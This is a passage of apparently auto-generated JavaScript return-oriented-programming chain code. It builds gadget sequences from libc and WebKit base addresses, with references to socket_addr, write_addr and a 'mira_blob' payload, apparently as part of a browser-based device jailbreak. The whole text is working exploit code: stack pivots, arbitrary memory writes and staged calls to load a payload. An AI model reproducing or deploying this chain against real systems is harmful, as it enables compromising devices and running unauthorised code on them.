set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+188944, //L2915
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2915:
db([0, 0]); // 0x0
//L2643:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
socket_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190272, //L2916
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2916:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+190344, //L2917
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190408, //L2919
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2919:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([2104, 0]); // 0x838
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575 //pop rax
]);
//L2921:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2923:
ropchain+190552, //L2922
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+211328, //L2924
//L2922:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+190688, //L2925
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+190704, //L2927
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+190672, //L2926
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2926:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2925:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2927:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+190808, //L2931
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+190856, //L2932
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+190824, //L2929
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2931:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2929:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2932:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+190968, //L2933+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+190960, //L2933
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2933:
db([0, 0]); // 0x0
set_gadgets([
ropchain+190984, //L2933+24
ropchain+191424, //L2928
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191024, //L2936
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2936:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2934:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2935:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191176, //L2938
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191192, //L2939
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+191160, //L2937
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2937:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2938:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2939:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+191288, //L2940
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191304, //L2941
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2940:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2941:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+191416, //L2942
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+191400, //L2943
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2943:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2942:
db([0, 0]); // 0x0
//L2928:
set_gadgets([
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191496, //L2946
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+191544, //L2947
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2946:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2944:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2945:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2947:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+191640, //L2949
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+191624, //L2948
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2948:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2949:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2950:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2951:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2952:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2953:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2955:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+191952, //L2956
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2956:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2958:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2960:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+192144, //L2961
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2961:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2964:
db([4, 0]); // 0x4
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+192288, //L2965
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2965:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192400, //L2969
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2969:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2967:
db([131072, 0]); // 0x20000
set_gadget(libc_base+788575,); //pop rax
//L2968:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+192528, //L2971
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+192512, //L2970
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2971:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2972:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2974:
ropchain+192680, //L2973
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+212656, //L2975
//L2973:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+192752, //L2976
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2976:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2977:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2980:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+792472, //pop rcx
//L2981:
(window.mira_blob||0),
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2982:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+192952, //L2984
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+192968, //L2985
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2984:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+193104, //L2990
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193168, //L2992
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193120, //L2988
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193152, //L2991
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2990:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2988:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2989:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2991:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2992:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+193280, //L2993+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+193272, //L2993
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2993:
db([0, 0]); // 0x0
set_gadgets([
ropchain+193296, //L2993+24
ropchain+199616, //L2987
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2995:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193392, //L2998
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2997:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2998:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+193448, //L3001
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3001:
db([0, 0]); // 0x0
//L2999:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+193496, //L3002
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3002:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3003:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+193600, //L3005
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193616, //L3006
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3005:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+193768, //L3008
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193800, //L3011
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+193784, //L3009
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+193752, //L3010
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3010:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3008:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3009:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3011:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193872, //L3012
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+193888, //L3013
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3012:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3013:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+193984, //L3015
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+193968, //L3014
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3014:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3015:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194064, //L3018
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
